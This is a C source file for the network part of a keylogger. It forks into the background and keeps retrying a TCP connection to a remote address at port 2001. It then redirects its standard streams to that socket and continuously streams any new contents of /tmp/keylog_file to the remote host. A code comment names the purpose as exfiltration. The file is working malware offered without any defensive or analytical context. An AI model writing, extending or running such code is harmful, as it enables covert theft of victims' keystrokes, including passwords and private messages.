#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define REMOTE_PORT 2001
#define POLL_DURATION 3
#define FILE_LOCATION "/tmp/keylog_file"
#define DEBUG 0

int attempt_connection_to_server(char * remote_address);
void read_and_write(int socket_fd);
FILE* open_keylog_file();

int main(int argc, char** argv)
{
	char * remote_address;
	int sock;
	int pid = -1;

	if(argc == 2)
    {
        remote_address = argv[1];
	}
	else
    {
        printf("ERROR NO REMOTE SUPPLIED\n");
        exit(1);
	}

	pid = fork();
    if( pid == 0 )
	{
		while( (sock = attempt_connection_to_server(remote_address)) == -1)
		{
			if(DEBUG)
				printf("Sleeping\n");
			sleep(POLL_DURATION);
		}
		dup2(sock, 0); //stdin
		dup2(sock, 1); //stdout
		dup2(sock, 2); //stderr

		read_and_write(sock);
	}
	return 1;
}

FILE* open_keylog_file(void)
{
	FILE* fp = NULL;

	while(fp == NULL)
	{
		fp = fopen(FILE_LOCATION, "r");
		if(fp == NULL)
		{
			if(DEBUG)
				printf("CANNOT FIND FILE AT LOCATION WAITING A BIT\n");
		}
		sleep(POLL_DURATION);
	}
	return fp;
}

void read_and_write(int socket_fd)
{
	FILE* fp = open_keylog_file();
	char *buffer;
	long prev_size = 0;
	while(1)
	{
		if(DEBUG)
			printf("PREV BYTES READ=%ld\n", prev_size);
		
		fseek(fp, 0, SEEK_END); 
		long file_size = ftell(fp); // Get file size
		long bytes_to_read = file_size - prev_size; // Get current file size - last file size ? anything new .. 
		fseek(fp, prev_size, SEEK_SET);
		
		if(bytes_to_read > 0)
		{
			if(DEBUG)
				printf("BYTES TO READ  =%ld\n", bytes_to_read);

			buffer = malloc(bytes_to_read*sizeof(char));
			prev_size = prev_size + bytes_to_read;
			size_t result = fread(buffer, 1, (size_t)bytes_to_read, fp);

			if(result != bytes_to_read)
			{
				printf("error\n");	
			}
			write(socket_fd, buffer, bytes_to_read); // Write new shit to the tcp buffer to exfil
			
			if(DEBUG)
				printf("%s\n", buffer);
			
			free(buffer);
		}
		sleep(POLL_DURATION);
	}

}



int attempt_connection_to_server(char * remote_address){
	// Create addr struct
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REMOTE_PORT);    // Port
    addr.sin_addr.s_addr = inet_addr(remote_address);  // Connection IP

	// Create socket
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == -1) {
        return -1;
    }

    int connection_failed = 1;

	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1)
    {
		close(sock);
		return -1;
    }

	return sock;
}
